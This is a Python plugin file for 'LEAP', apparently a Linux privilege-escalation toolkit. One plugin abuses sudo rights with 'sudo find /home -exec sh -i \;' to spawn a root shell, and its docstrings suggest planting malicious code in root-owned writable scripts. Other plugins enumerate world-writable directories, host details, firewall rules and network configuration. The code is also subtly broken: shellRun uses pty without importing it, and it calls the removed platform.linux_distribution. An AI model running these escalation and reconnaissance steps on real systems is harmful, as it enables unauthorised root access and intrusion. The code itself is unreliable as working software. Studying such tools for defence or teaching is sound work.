""" Plugins for LEAP designed by James Shuttleworth """

from plugins import PrivEsc, Enumeration

import os, tempfile
import platform

from subprocess import Popen, PIPE

#import pty


# A very basic method, but useful
def shellRun(command):
    """ Put given commands into a temporary file, spawn a shell and explain how to use the command """
    f = tempfile.NamedTemporaryFile(delete=False)
    fname=f.name
    f.write(command.encode())
    f.close()
    os.system(f"chmod u+x {fname}")
    print(f"Execute command with '{fname}'...\nCtrl-D to leave shell")
    
    pty.spawn("/bin/bash")
    #os.system(fname)
    os.unlink(fname)

        

    

class SudoRights(PrivEsc):
    """Exploiting SUDO rights/user, enter 'whoami' after executing to check root privilages

    """
    def __init__(self):
        PrivEsc.__init__(self)
        self.name="SudoRights"
        self.author="Alketbij"
        self.description="Exploiting SUDO rights/user, enter 'whoami' after executing to check root privilages"
    def execute(self):
        print("SudoRights:")
        print("**********")
        print()
        print("P.S: Enter 'whoami'")
        print("Who am I?")
        os.system("whoami")
        os.system("sudo -l")
        os.system("sudo find /home -exec sh -i \;")



class WritableScripts(Enumeration):
    """If you find a script that is owned by root but is writable by anyone you can add your
        own malicious code in that script that will escalate your privileges when the script is run as root.

    """
    def __init__(self):
        Enumeration.__init__(self)
        self.name="WritableScripts"
        self.author="Alketbij"
        self.description="Find script owned by root which writable by anyone"
    def execute(self):
        print("WritableScripts:")
        print("**************")
        print()
        #World writable files directories
        os.system("find / -writable -type d 2>/dev/null")
        os.system("find / -perm -222 -type d 2>/dev/null")
        os.system("find / -perm -o w -type d 2>/dev/null")

        # World executable folder
        os.system("find / -perm -o x -type d 2>/dev/null")

        # World writable and executable folders
        os.system("find / \( -perm -o w -perm -o x \) -type d 2>/dev/null")



class BasicHostInfo(Enumeration):
    """Basic info on the host machine

    """
    def __init__(self):
        Enumeration.__init__(self)
        self.name="BasicHostInfo"
        self.author="Alketbij"
        self.description="Display basic info of the host machine"
    def execute(self):
        print("BasicHostInfo:")
        print("**************")
        print()
        print("Hostname:")
        os.system("hostname")
        print("Current User:")
        os.system("whoami")
        print("ID Info:")
        os.system("id")
        
        print()
        print('Uname:', platform.uname())

        print()
        print('Distribution :', platform.linux_distribution())
        print('Machine :', platform.machine())
        print('Node :', platform.node())
        print('Processor :', platform.processor())
        print('Release :', platform.release())
        print('System :', platform.system())
        print('Version :', platform.version())
        print('Platform :', platform.platform())


class BasicNetworkInfo(Enumeration):
    """Basic info on the network

    """
    def __init__(self):
        Enumeration.__init__(self)
        self.name="BasicNetworkInfo"
        self.author="Alketbij"
        self.description="Display basic info of the network"
    def execute(self):
        print("BasicNetworkInfo:")
        print("**************")
        print()
        os.system("/sbin/ifconfig -a")
        os.system("cat /etc/network/interfaces")
        os.system("cat /etc/sysconfig/network")
        os.system("cat /etc/resolv.conf")
        
        os.system("cat /etc/sysconfig/network")
        os.system("cat /etc/networks")
        os.system("iptables -L")
        os.system("hostname")
        os.system("dnsdomainname")

        os.system("lsof -i")
        os.system("lsof -i :80")
        os.system("grep 80 /etc/services")
        os.system("netstat -antup")
        os.system("netstat -antpx")
        os.system("netstat -tulpn")
        os.system("chkconfig --list")
        os.system("chkconfig --list | grep 3:on")
        os.system("last")
        os.system("w")

        os.system("arp -e")
        os.system("route")
        os.system("/sbin/route -nee")
